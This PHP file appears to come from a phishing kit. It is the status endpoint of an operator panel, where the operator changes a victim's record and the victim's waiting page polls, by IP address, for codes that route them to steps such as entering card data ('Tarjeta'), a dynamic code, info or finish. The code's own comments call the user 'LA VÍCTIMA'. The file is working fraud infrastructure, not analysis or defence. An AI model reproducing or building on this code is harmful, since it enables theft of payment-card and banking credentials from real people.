<?php
// panel/process/estado.php
require_once('../lib/funciones.php');

// 1. SI EL PANEL ENVÍA UNA ORDEN (Cuando tú haces clic en un botón)
if (isset($_POST['id']) && isset($_POST['est'])) {
    $id_buscado = $_POST['id'];
    $nuevo_estado = $_POST['est'];
    
    $data = _data_load();
    $encontrado = false;

    foreach ($data as &$it) {
        if (strval($it['idreg']) === strval($id_buscado)) {
            $it['status'] = $nuevo_estado;
            $it['horamodificado'] = _now();
            $encontrado = true;
            break;
        }
    }

    if ($encontrado) {
        _data_save($data);
        echo "OK";
    } else {
        echo "ERROR_ID";
    }
} 

// 2. SI LA VÍCTIMA CONSULTA (Desde WAITING.php)
else if (isset($_POST['consultar_ip']) || isset($_GET['v'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $id_reg = traer_regitro($ip); // Obtenemos el ID asociado a esa IP
    
    if ($id_reg) {
        $estado_actual = buscar_estado($id_reg); // Buscamos el status (1, 2, 6, etc)
        
        // Convertimos el número a la letra que espera el switch de la víctima
        switch ($estado_actual) {
            case "1":  echo "w"; break; // Wait (Espera)
            case "2":  echo "d"; break; // Dinámica
            case "6":  echo "t"; break; // Tarjeta
            case "4":  echo "i"; break; // Info
            case "10": echo "f"; break; // Finalizar
            case "14": echo "m"; break; // Mensaje
            default:   echo "w"; break;
        }
    } else {
        echo "w";
    }
}
?>
